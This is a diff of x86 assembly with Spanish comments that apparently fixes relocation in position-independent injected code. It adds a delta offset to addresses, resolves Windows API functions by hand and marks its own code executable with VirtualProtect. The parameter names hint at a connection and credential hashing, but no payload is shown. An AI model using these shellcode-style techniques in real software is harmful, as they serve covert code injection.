@@ -58,13 +58,13 @@ proc main,LoadLibrary_,GetProcAddress_,hConexion,hashUserPass
 	ecall2 GetProcAddress
 	mov %$VirtualProtect_,eax
 	
-	;//Esta parte es probisional
 	;//Cambio la proteccion
 	lea ebx,%$OldProtect
 	push ebx
 	push PAGE_EXECUTE_READWRITE
-	push kernel32N-main;Calculo el tamaño de mi code
-	push main	
+	push EOF-main;Calculo el tamaño de mi code
+	push main
+	add [esp],esi
 	call eax;//VirtualProtect
 	;//Empiezo a guardar las direcciones de las funciones
 	mov ebx,VirtualProtect
@@ -73,6 +73,7 @@ proc main,LoadLibrary_,GetProcAddress_,hConexion,hashUserPass
 	
 	;//Busco las direcciones de las funciones que posteriormente usare
 	push VirtualAllocN
+	add [esp],esi
 	push dword %$kernel32
 	ecall2 GetProcAddress
 	
@@ -80,6 +81,7 @@ proc main,LoadLibrary_,GetProcAddress_,hConexion,hashUserPass
 	mov [ebx+esi+1],eax	
 	
 	push ExitProcessN
+	add [esp],esi
 	push dword %$kernel32
 	ecall2 GetProcAddress
 	
@@ -87,6 +89,7 @@ proc main,LoadLibrary_,GetProcAddress_,hConexion,hashUserPass
 	mov [ebx+esi+1],eax	
 	
 	push TlsAllocN
+	add [esp],esi
 	push dword %$kernel32
 	ecall2 GetProcAddress
 	
@@ -94,6 +97,7 @@ proc main,LoadLibrary_,GetProcAddress_,hConexion,hashUserPass
 	mov [ebx+esi+1],eax	
 	
 	push msvcrtN
+	add [esp],esi
 	ecall2 LoadLibraryA
 	;mov dword %$msvcrt,eax
 	
